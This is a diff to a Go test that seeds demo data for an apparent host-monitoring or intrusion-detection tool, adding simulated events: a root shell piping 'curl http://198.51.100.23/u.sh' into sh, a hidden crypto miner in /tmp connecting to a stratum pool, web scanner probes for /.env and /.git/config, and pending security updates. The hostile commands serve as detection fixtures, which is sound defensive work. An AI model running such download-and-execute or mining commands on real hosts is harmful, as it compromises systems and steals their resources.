@@ -113,6 +113,27 @@ func TestWriteDemoData(t *testing.T) {
 	add(day(5, 2).Add(4*time.Minute), hosts[1], "file.changed", map[string]any{"path": "/etc/systemd/system/update-checker.service", "category": "systemd"})
 	add(day(5, 2).Add(6*time.Minute), hosts[1], "canary.opened", map[string]any{"canary_id": "demo-canary", "path": "/srv/app/.env.backup", "exe": "/usr/bin/cat", "uid": "0", "pid": float64(48211)})
 	add(day(6, 8), hosts[0], "ssh.login", map[string]any{"user": "root", "ip": "203.0.113.77", "method": "publickey", "fingerprint": "SHA256:demoUnknown"})
+	add(day(5, 2).Add(5*time.Minute), hosts[1], "process.exec", map[string]any{"pid": float64(48190), "ppid": float64(48001), "uid": float64(0),
+		"exe": "/usr/bin/bash", "comm": "bash", "cmdline": "bash -c curl -fsSL http://198.51.100.23/u.sh | sh", "cwd": "/root",
+		"parent_exe": "/usr/sbin/sshd", "parent_comm": "sshd", "signals": []any{"cmd_download_exec"}})
+	add(day(5, 2).Add(5*time.Minute+20*time.Second), hosts[1], "process.exec", map[string]any{"pid": float64(48201), "ppid": float64(48190), "uid": float64(0),
+		"exe": "/tmp/.x/kworkerd", "comm": "kworkerd", "cmdline": "/tmp/.x/kworkerd -o stratum+tcp://203.0.113.200:3333", "cwd": "/tmp/.x",
+		"parent_exe": "/usr/bin/bash", "parent_comm": "bash", "signals": []any{"tmp_exe", "cmd_miner"}})
+	add(day(5, 2).Add(5*time.Minute+40*time.Second), hosts[1], "net.connection", map[string]any{"remote_ip": "203.0.113.200",
+		"remote_port": float64(3333), "local_port": float64(51234), "process": "kworkerd", "exe": "/tmp/.x/kworkerd", "uid": "0", "private": false})
+	for i, ip := range []string{"203.0.113.41", "198.51.100.88", "192.0.2.199"} {
+		add(now.Add(-time.Duration(3+i*5)*time.Hour), hosts[0], "web.activity", map[string]any{"log": "/var/log/nginx/access.log", "ip": ip,
+			"requests": float64(40 + i*30), "status_2xx": float64(1), "status_4xx": float64(38 + i*30), "probes": float64(12 + i*4),
+			"exploit_kinds": []any{"traversal"}, "exploits_ok": float64(0), "shells": float64(0), "logins": float64(0),
+			"samples": []any{"GET /.env", "GET /wp-login.php", "GET /.git/config"}, "user_agent": "Mozilla/5.0 zgrab/0.x"})
+	}
+	for i, h := range hosts[:2] {
+		add(now.Add(-time.Duration(2+i)*time.Hour), h, "system.updates", map[string]any{"pending": float64(4 + i*9), "security": float64(i * 3),
+			"security_packages": []any{"openssl", "libssl3t64", "linux-image-generic"}[:i*3], "security_oldest_days": float64(i * 9),
+			"reboot_required": i == 1, "reboot_days": float64(i * 8), "reboot_packages": []any{"linux-image-6.8.0-147-generic"},
+			"kernel_running": "6.8.0-110-generic", "kernel_newest": []string{"6.8.0-110-generic", "6.8.0-147-generic"}[i],
+			"unattended_upgrades": true, "lists_age_days": float64(0)})
+	}
 	add(now.Add(-26*time.Minute), hosts[0], "user.added", map[string]any{"user": "backup", "uid": float64(1003)})
 	add(now.Add(-12*time.Minute), hosts[1], "file.changed", map[string]any{"path": "/etc/sudoers.d/90-app", "category": "sudo"})
 
